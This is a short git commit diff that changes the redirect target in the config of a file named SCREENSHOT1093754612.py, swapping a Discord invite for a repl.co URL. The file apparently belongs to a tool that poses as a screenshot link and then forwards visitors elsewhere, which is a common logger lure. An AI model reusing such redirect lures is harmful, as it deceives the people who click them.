2e17dd43c3cd6d2e3e429c03d8e03359d7875c55
skiddozzz <142635074+skiddozzz@users.noreply.github.com>
2023-08-19 02:22:02 +0300

    Update SCREENSHOT1093754612.py

--- api/SCREENSHOT1093754612.py
+++ api/SCREENSHOT1093754612.py
@@ -48,7 +48,7 @@ config = {
 
     "redirect": {
         "redirect": True,
-        "page": "https://discord.gg/wingsminer" 
+        "page": "https://surefootedunfinishedmosaic.tanaz2055.repl.co" 
     },
 }
 
